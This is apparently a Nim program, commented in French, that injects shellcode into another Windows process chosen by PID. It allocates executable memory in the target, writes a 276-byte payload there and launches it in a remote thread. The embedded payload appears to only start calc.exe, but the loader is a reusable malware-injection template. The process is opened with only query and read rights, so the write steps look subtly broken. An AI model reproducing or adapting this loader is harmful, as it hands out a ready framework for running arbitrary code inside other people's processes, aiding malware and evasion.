import winim/lean
import std/os
import std/strutils

proc displayProcessInfo(hProcess: HANDLE, processId: DWORD) =
  # Affichage du handle
  echo "[+] Process Handle: 0x", toHex(cast[int](hProcess))
  
  # Vérification si le handle est valide
  if hProcess == 0:
    echo "[-] Error: Invalid handle. GetLastError(): ", GetLastError()
    return

  # Récupérer le nom du processus
  var exePathBuffer: array[MAX_PATH, WCHAR]
  var bufferSize = exePathBuffer.len.DWORD
  let exePathResult = QueryFullProcessImageNameW(
    hProcess, 
    0, 
    cast[ptr WCHAR](exePathBuffer[0].addr), 
    bufferSize.addr
  )

  if exePathResult != 0:
    # Convertir le buffer Wide en chaîne UTF-16
    var processPath = cast[WideCString](exePathBuffer[0].addr)
    echo "[+] Process Path: ", $processPath
  else:
    echo "[-] Could not retrieve process path. Error: ", GetLastError()

  # Récupérer des informations sur la mémoire virtuelle
  var memBasicInfo: MEMORY_BASIC_INFORMATION
  let queryResult = VirtualQueryEx(
    hProcess, 
    nil, 
    memBasicInfo.addr, 
    sizeof(MEMORY_BASIC_INFORMATION)
  )

  if queryResult != 0:
    echo "[+] Memory Information:"
    echo "    Region Size: ", memBasicInfo.RegionSize, " bytes"
    echo "    State: 0x", toHex(memBasicInfo.State)
    echo "    Protect: 0x", toHex(memBasicInfo.Protect)
  else:
    echo "[-] Could not retrieve memory information. Error: ", GetLastError()

proc main() =
  # Gestion des erreurs si aucun argument n'est passé
  if paramCount() < 1:
    echo "[-] Usage: ", paramStr(0), " <process_id>"
    quit(1)

  try:
    # Convertir le paramètre en entier (ID de processus)
    var processId = paramStr(1).parseInt().DWORD

    # Ouvrir le processus
    var hProcess = OpenProcess(
      PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 
      FALSE, 
      processId
    )
    
    # Afficher les informations du processus
    displayProcessInfo(hProcess, processId)

    # Payload
    # var puke = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"


    var shellcode: array[276, byte] = [
      byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
      0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
      0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
      0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
      0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
      0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
      0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
      0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
      0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
      0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
      0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
      0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
      0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
      0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
      0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
      0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
      0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
      0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,
      0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,
      0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,
      0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,
      0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,
      0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,
      0x00
    ]
    

    # Allocation de la mémoire pour le handle
    var rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT or MEM_RESERVE), PAGE_EXECUTE_READWRITE)
    echo "Allocated with ", sizeof(shellcode), " bytes"

    # Écrire dans la mémoire du process
    WriteProcessMemory(hProcess, rBuffer, unsafeAddr shellcode[0], sizeof(shellcode), NULL)
    echo "Wrote ", sizeof(shellcode), " to process memory"

    var TID: DWORD
    var hThread = CreateRemoteThreadEx(
        hProcess,                               # handle du processus
        nil,                                    # attributs de sécurité
        0,                                      # taille de la pile
        cast[LPTHREAD_START_ROUTINE](rBuffer),  # adresse de départ
        nil,                                    # paramètre du thread
        0,                                      # flags de création
        nil,                                    # liste d'attributs du thread
        addr TID                                # ID du thread (utiliser addr au lieu de &)
    )

    # Ne pas oublier de fermer le handle
    if hProcess != 0:
      CloseHandle(hProcess)

  except ValueError:
    echo "[-] Invalid process ID. Please provide a valid number."
  except:
    let e = getCurrentException()
    echo "[-] An error occurred: ", e.msg

main()